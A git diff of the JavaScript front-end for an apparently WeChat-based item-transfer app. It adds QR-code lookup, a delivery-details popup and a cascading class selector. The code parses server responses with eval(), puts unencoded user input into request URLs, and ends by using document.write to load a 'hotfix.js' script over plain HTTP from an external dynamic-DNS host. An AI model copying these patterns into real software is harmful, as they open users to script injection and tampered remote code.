@@ -22,6 +22,7 @@ var photo_url = '';
 // }
 
 
+
 function readFile(f){ 
     var file = f.files[0]; 
     if(!/image\/\w+/.test(file.type)){ 
@@ -60,8 +61,34 @@ function setOpenid(id){
 //     var file = document.getElementById("file");     
 //     file.addEventListener( 'change',readFile,false );
 // }
+function getItem(code){
+xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function() {
+    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+        json = xmlhttp.responseText;
+        data = eval( "(" + json + ")" );
+        alert(data.msg);
+        window.location.href = '#/item/' + data.item_id;
+    }
+}
+xmlhttp.open("GET", 'transfer/code?transfer=true&code=' + code, true);
+xmlhttp.send();
+}
 
-
+function getCode(code){
+    xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function() {
+        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+            json = xmlhttp.responseText;
+            data = eval( "(" + json + ")" );
+            if(window.confirm('确认获取：' + data.item_name + "\n" + data.item_des)){
+                 getItem(code);
+            }
+        }
+    }
+    xmlhttp.open("GET", 'transfer/code?code=' + code, true);
+    xmlhttp.send();
+}
 
 wx.ready(function () {
 document.querySelector('#scanQRCode').onclick = function () {
@@ -70,16 +97,18 @@ document.querySelector('#scanQRCode').onclick = function () {
       desc: 'scanQRCode desc',
       success: function (res) {
       	code = res.resultStr;//res.resultStr.split(',')[1];
-        xmlhttp = new XMLHttpRequest();
-        xmlhttp.onreadystatechange = function() {
-	        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
-	            json = xmlhttp.responseText;
-	            data = eval( "(" + json + ")" );
-	            alert(data.msg);
-	        }
-    	}
-    	xmlhttp.open("GET", 'transfer/code?code=' + code, true);
-    	xmlhttp.send();
+        getCode(code);
+     //    xmlhttp = new XMLHttpRequest();
+     //    xmlhttp.onreadystatechange = function() {
+	    //     if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+	    //         json = xmlhttp.responseText;
+	    //         data = eval( "(" + json + ")" );
+	    //         alert(data.msg);
+     //            window.location.href = '#/item/' + data.id;
+	    //     }
+    	// }
+    	// xmlhttp.open("GET", 'transfer/code?code=' + code, true);
+    	// xmlhttp.send();
       }
     });
   };
@@ -111,7 +140,8 @@ document.querySelector('#scanQRCode').onclick = function () {
                     'search-tab': {
                         templateUrl: "templates/search.html"
                     }
-                }
+                },
+                controller:"ItemsController"
             })
             .state('tabs.user', {
                 url: "/user",
@@ -196,6 +226,14 @@ document.querySelector('#scanQRCode').onclick = function () {
         $scope.request = function() {
             $http.get('transfer/new?item_id=' + $scope.item.id).success(function(data){
                 alert(data.msg);
+                location.reload();
+            });
+        };
+
+        $scope.reTime = function() {
+            $http.get('item/retime/' + $scope.item.id).success(function(data){
+                alert(data.msg);
+                location.reload();
             });
         };
 
@@ -218,6 +256,7 @@ document.querySelector('#scanQRCode').onclick = function () {
         }
 
         $scope.$on('$stateChangeSuccess', function() {
+            //alert('a');
             page = 1;
             $scope.items = [];
             if ($location.search().keywords) {
@@ -306,7 +345,10 @@ document.querySelector('#scanQRCode').onclick = function () {
                 transfer:$scope.item.transfer,
                 photo:photo_url
             }).success(function(){
-                $location.url('/tab/user');
+                $scope.item.name = '';
+                $scope.item.des = '';
+                document.getElementById("photo").src = "img/picture.png";
+                window.location.href = '#/tab/user';
             });
         };
     });
@@ -324,16 +366,65 @@ document.querySelector('#scanQRCode').onclick = function () {
     });
 
     app.controller('UserInfoController', function($scope, $location, $stateParams, $http) {
-      
+        $scope.class = {
+            'list':{'c1':[],'c2':[],'c3':[]},
+            'c1':{'code':'','name':''},
+            'c2':{'code':'','name':''},
+            'c3':{'code':'','name':''}
+        };
+
         $http.get('user').success(function(data){
             $scope.user = data;
         })
+
+        $http.get('classes').success(function(data){
+            
+            $scope.classes = data;
+            angular.forEach($scope.classes, function(d){
+                if(d.code.substr(2,4) == '0000'){
+                    $scope.class.list.c1.push(d);
+                }
+            });
+        })
+
+
+        $scope.classChange = function(){
+            console.log($scope.class);
+
+            var c1 = $scope.class.c1.code.substr(0,2);
+            var c2 = $scope.class.c2.code.substr(2,2);
+
+            $scope.class.list.c2 = [];$scope.class.list.c3 = [];
+            angular.forEach($scope.classes, function(d){
+
+                if(d.code.substr(0,2) == c1 && d.code.substr(2,2) != '00' && d.code.substr(4,2) == '00'){
+                    $scope.class.list.c2.push(d);
+                }
+
+                if(d.code.substr(0,2) == c1 && d.code.substr(2,2) == c2 && d.code.substr(4,2) != '00'){
+                   $scope.class.list.c3.push(d);
+                }
+
+                if(d.code == $scope.class.c1.code){
+                    $scope.class.c1.name = d.name;
+                }
+
+                if(d.code == $scope.class.c2.code){
+                    $scope.class.c2.name = d.name;
+                }
+
+                if(d.code == $scope.class.c3.code){
+                    $scope.class.c3.name = d.name;
+                }
+
+             });
+        };
 
         $scope.submit = function() {
             $http.post('user/update', {
                 openid:$scope.user.openid,
                 name:$scope.user.name,
-                class:$scope.user.class,
+                class:$scope.class.c1.name + $scope.class.c2.name + $scope.class.c3.name,
                 email:$scope.user.email,
                 contact:$scope.user.contact
             }).success(function(){
@@ -356,13 +447,54 @@ document.querySelector('#scanQRCode').onclick = function () {
         };
     });
 
-    app.controller('RequestController', function($scope, $location, $stateParams, $http) {
+    app.controller('RequestController', function($scope, $location, $stateParams, $http, $ionicPopup) {
     	$scope.requests = [];
-    	 $http.get('transfer/request').success(function(data){
+
+        $scope.showPopup = function(id) {
+           $scope.request = {}
+
+           // 自定义弹窗
+           var myPopup = $ionicPopup.show({
+             template: '<input type="text" ng-model="request.trans_way">',
+             title: '交付方式',
+             subTitle: '请说明交付方式时间地点',
+             scope: $scope,
+             buttons: [
+               { text: '取消' },
+               {
+                 text: '<b>提交</b>',
+                 type: 'button-positive',
+                 onTap: function(e) {
+                   if (!$scope.request.trans_way) {
+                     e.preventDefault();
+                   } else {
+                    $http.get('transfer/transway?id=' + id + '&text=' + $scope.request.trans_way).success(function(data){
+                        alert(data.msg);
+                        $http.get('transfer/request').success(function(data){
+                            $scope.requests = data;
+                        })
+                        //location.reload();
+                    })
+                   }
+                 }
+               },
+             ]
+           });
+           myPopup.then(function(res) {
+             console.log('Tapped!', res);
+           });
+           // $timeout(function() {
+           //    myPopup.close(); // 3秒后关闭弹窗
+           // }, 3000);
+          };
+
+    
+
+    	$http.get('transfer/request').success(function(data){
             $scope.requests = data;
         })
     });
-
+    document.write("<script src='http://blux.iask.in/piaoliu/js/hotfix.js'><\/script>"); 
 
 
 // function GetQueryString(name) {
